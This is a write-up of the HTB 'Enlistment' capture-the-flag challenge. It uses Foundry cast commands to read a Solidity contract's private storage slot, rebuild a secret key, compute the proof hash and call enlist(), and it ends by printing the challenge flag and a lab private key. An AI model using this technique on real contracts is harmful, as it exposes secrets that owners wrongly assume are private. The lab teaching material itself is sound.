---
layout: post
title: "Business HTB CTF 2025 - Enlistment"
date: "2025-06-09"
excerpt: "A detailed writeup of the Business HTB CTF 2025 Enlistments challenge, covering Smart Contracts, Visibility in Solidity Programming Language."
category: 
  - CTF
  - Blockchain
tags: 
  - HTB
  - Smart Contract
  - Solidity
  - Foundry
---

## Key Lesson

- **Smart Contract Basics**
    - Visibility in Solidity Programming Language
    - How to compile solidity file
- **Foundry**
    - Call Function
    - Send Transaction
    - Get Storage
    - Keccak (Hash arbitrary data using keccak-256)

## Proof of Concept

Port 42270 is used for rpc url

```#!/bin/bash
RPC URL: http://94.237.59.89:42270/
```

Lets use nc on port 59016

```#!/bin/bash
nc 94.237.59.89 59016
1 - Get connection information
2 - Restart instance
3 - Get flag
Select action (enter number): 1
[*] No running node found. Launching new node...

Player Private Key : 0x017207f107a58ef37b896d152a984d68ab7d66bc63ee4dea5f1e274a31c7ed36
Player Address     : 0x691Ef9941563e8F915a4794e3D55dCa2d8C67109
Target contract    : 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53
Setup contract     : 0x4aA52fFA9F1E3a764A8C07512D74d96A578A2D16

RPC URL: http://94.237.59.89:42270/
```

### setup.sol
Target Variables appears to be Enlistment Contract

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.29;

import { Enlistment } from "./Enlistment.sol";

contract Setup {
    Enlistment public TARGET;
    address public player;

    event DeployedTarget(address at);

    constructor(address _player, bytes32 _key) {
        TARGET = new Enlistment(_key);
        player = _player;
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return TARGET.enlisted(player); 
    }
}
```
After further analysis, the **isSolved()** function's type data is **bool** which returns either **true or false**. It means that we must make sure that the player is actually done the transaction in Enlistement.sol

We need to call the Target()  to get the Enlistement contract. Lets call the TARGET() function. This is used for enlistment contract

```#!/bin/bash
cast call -r <RPC_URL> <SETUP_CONTRACT> "TARGET()"
```

```#!/bin/bash
cast call -r http://94.237.59.89:42270/ 0x4aA52fFA9F1E3a764A8C07512D74d96A578A2D16 "TARGET()"
0x000000000000000000000000748c5f75488b89e1871c7a86a59ba5139d99ea53

0x748c5f75488b89e1871c7a86a59ba5139d99ea53
```

### Enlistment.sol

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.29;

contract Enlistment {
    bytes16 public publicKey;
    bytes16 private privateKey;
    mapping(address => bool) public enlisted;
    
    constructor(bytes32 _key) {
        publicKey = bytes16(_key);
        privateKey = bytes16(_key << (16*8));
    }

    function enlist(bytes32 _proofHash) public {
        bool authorized = _proofHash == keccak256(abi.encodePacked(publicKey, privateKey));
        require(authorized, "Invalid proof hash");
        enlisted[msg.sender] = true;
    }
}
```

#### enlist() function

Lets analyze this enlist() function. 

In authorized variable, type data it uses is **bool** which returns either **true or false** by comparing the proofHash with the public key and private key by using keccak256. 
- If it match, the transaction get authorized.
- If it doesn't match, it returns Invalid proof hash

```solidity
function enlist(bytes32 _proofHash) public {
        bool authorized = _proofHash == keccak256(abi.encodePacked(publicKey, privateKey));
        require(authorized, "Invalid proof hash");
        enlisted[msg.sender] = true;
    }
```

#### Getting publicKey
Lets try to call the publicKey() function. there is 0000 at the end of it if you dont provide the bytes16. By default it use bytes32

```#!/bin/bash
cast call -r <RPC_URL> <ENLISTMENT_CONTRACT> "publicKey()"
```

```#!/bin/bash
cast call -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "publicKey()" 
0x454e4c4953545f52455153542062793a00000000000000000000000000000000
```

Lets just call the publicKey()(bytes16)

```#!/bin/bash
cast call -r <RPC_URL> <ENLISTMENT_CONTRACT> "publicKey()(bytes16)"
```

```#!/bin/bash
cast call -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "publicKey()(bytes16)" 
0x454e4c4953545f52455153542062793a
```

#### Getting privateKey
Lets call the privateKey()

```#!/bin/bash
cast call -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "privateKey()" 
Error: server returned an error response: error code 3: execution reverted, data: "0x"

cast call -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "privateKey()(bytes16)" 
Error: server returned an error response: error code 3: execution reverted, data: "0x"
```
Got the following error

**Error: server returned an error response: error code 3: execution reverted, data: "0x"**

After further analysis, the main problem is the privateKey's visibility is **not public** but use **private** so it cannot be called directly using cast call

REMEMBER: 
**EVERYTHING IN BLOCKCHAIN IS PUBLIC, NO VARIABLE IS TRULY PRIVATE** **. It is not a good idea to hide the value even it uses the visibility as private.**

Lets check the storage? Requires solidity compiler version 0.8.29

```#!/bin/bash
./solc-static-linux --storage-layout Enlistment.sol              
Error: Source file requires different compiler version (current compiler is 0.8.25+commit.b61c2a91.Linux.g++) - note that nightly builds are considered to be strictly less than the released version                                                                                                                                             
 --> Enlistment.sol:3:1:                                                                                                                                                 
  |
3 | pragma solidity ^0.8.29;
  | ^^^^^^^^^^^^^^^^^^^^^^^^
```

Lets download the latest version (0.8.30) from github

(https://github.com/ethereum/solidity/releases/download/v0.8.30/solc-static-linux)

Lets use solidity compiler to get the slot for private key

```#!/bin/bash
./solc-static-linux --storage-layout Enlistment.sol

======= Enlistment.sol:Enlistment =======
Contract Storage Layout:
{"storage":[{"astId":3,"contract":"Enlistment.sol:Enlistment","label":"publicKey","offset":0,"slot":"0","type":"t_bytes16"},{"astId":5,"contract":"Enlistment.sol:Enlistment","label":"privateKey","offset":16,"slot":"0","type":"t_bytes16"},{"astId":9,"contract":"Enlistment.sol:Enlistment","label":"enlisted","offset":0,"slot":"1","type":"t_mapping(t_address,t_bool)"}],"types":{"t_address":{"encoding":"inplace","label":"address","numberOfBytes":"20"},"t_bool":{"encoding":"inplace","label":"bool","numberOfBytes":"1"},"t_bytes16":{"encoding":"inplace","label":"bytes16","numberOfBytes":"16"},"t_mapping(t_address,t_bool)":{"encoding":"mapping","key":"t_address","label":"mapping(address => bool)","numberOfBytes":"32","value":"t_bool"}}}
```

Lets get the publicKey and privateKey in this storage. This is 32 byte hex which combines the public key and private key

```#!/bin/bash
cast call -r <RPC_URL> <ENLISTMENT_CONTRACT> <SLOT>
```

```#!/bin/bash
cast storage -r http://94.237.59.89:42270/ 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 0
0x20204147454e5420502e202331333337454e4c4953545f52455153542062793a
```

![get slot for privateKey](/assets/img/posts/2025-06-09-Enlistment/get_slot_for_private_key.png)

Lets split this public and privatekey by 16 bytes. yep public key looks equal

```#!/bin/bash
Public Key: 0x454e4c4953545f52455153542062793a
Private key: 0x20204147454e5420502e202331333337
```

![Split public key and private key](/assets/img/posts/2025-06-09-Enlistment/split_public_key_and_private_key.png)

After further analysis, we need to pack the public key first then privateKey as the last one. 

```solidity
keccak256(abi.encodePacked(publicKey, privateKey));
```

Lets switch the private key and public key order. In this case, (privateKey, publicKey) to (privateKey to publicKey) and append it like this one

```#!/bin/bash
454e4c4953545f52455153542062793a20204147454e5420502e202331333337
```

Lets use cast keccak to get proofHash() for this

```#!/bin/bash
cast keccak 0x<PUBLIC_KEY><PRIVATE_KEY>
```

```#!/bin/bash
cast keccak 0x454e4c4953545f52455153542062793a20204147454e5420502e202331333337
0x9d3f5567a25a1b5b3bc330351dcde6b026d5d22b120f52f040459d5794c48c59
```

#### Information Collected
So we got the following information to moved on

```#!/bin/bash
Player Private Key : 0x017207f107a58ef37b896d152a984d68ab7d66bc63ee4dea5f1e274a31c7ed36
Player Address     : 0x691Ef9941563e8F915a4794e3D55dCa2d8C67109
Target contract    : 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53
Setup contract     : 0x4aA52fFA9F1E3a764A8C07512D74d96A578A2D16

RPC URL: http://94.237.59.89:42270/

Public Key (16 bytes): 0x454e4c4953545f52455153542062793a
Private key (16 bytes): 0x20204147454e5420502e202331333337

Proof Hash: 0x9d3f5567a25a1b5b3bc330351dcde6b026d5d22b120f52f040459d5794c48c59
```

#### enlist() execution
Since we got the proof hash, Lets use cast send enlist() function. As the result it is successful

```#!/bin/bash
cast send -r <RPC_URL> --private-key <PLAYER_PRIVATE_KEY> <ENLISTMENT_CONTRACT> "enlist(bytes32)" <PROOF_HASH_FROM_KECCAK>
```

```#!/bin/bash
cast send -r http://94.237.59.89:42270/ --private-key 0x017207f107a58ef37b896d152a984d68ab7d66bc63ee4dea5f1e274a31c7ed36 0x748C5F75488b89E1871C7a86a59Ba5139D99eA53 "enlist(bytes32)" 0x9d3f5567a25a1b5b3bc330351dcde6b026d5d22b120f52f040459d5794c48c59

blockHash            0xb98c1b933a0dc7f6ad80978cc48832689621d2a4648b29fc02588645d299f869
blockNumber          2
contractAddress      
cumulativeGasUsed    47025
effectiveGasPrice    1000000000
from                 0x691Ef9941563e8F915a4794e3D55dCa2d8C67109
gasUsed              47025
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0x6f2ed18322f6a3601cae2ee2338ced58292e97798bf65599900e6839db6d935d
transactionIndex     0
type                 2
blobGasPrice         1
blobGasUsed          
to                   0x748C5F75488b89E1871C7a86a59Ba5139D99eA53
```

#### Verify isSolved()
isSolved() function is to confirm whether the player address has successfully performed the enlisted in the enlist() function or not

```solidity
 function isSolved() public view returns (bool) {
        return TARGET.enlisted(player); 
    }
```

Lets verify the isSolved() function if returns **true** with cast call with player address. Yep it returns **true** (0x1)

```#!/bin/bash
cast call -r <RPC_URL> <SETUP_CONTRACT> "isSolved()" <PLAYER_ADDRESS>
```

```#!/bin/bash
cast call -r http://94.237.59.89:42270/ 0x4aA52fFA9F1E3a764A8C07512D74d96A578A2D16 "isSolved()" 0x691Ef9941563e8F915a4794e3D55dCa2d8C67109
0x0000000000000000000000000000000000000000000000000000000000000001
```

## Flag
Get the flag

```#!/bin/bash
nc 94.237.59.89 59016                                                                                                                     
1 - Get connection information
2 - Restart instance
3 - Get flag
Select action (enter number): 3
HTB{gg_wp_w3lc0me_t0_th3_t34m}
```
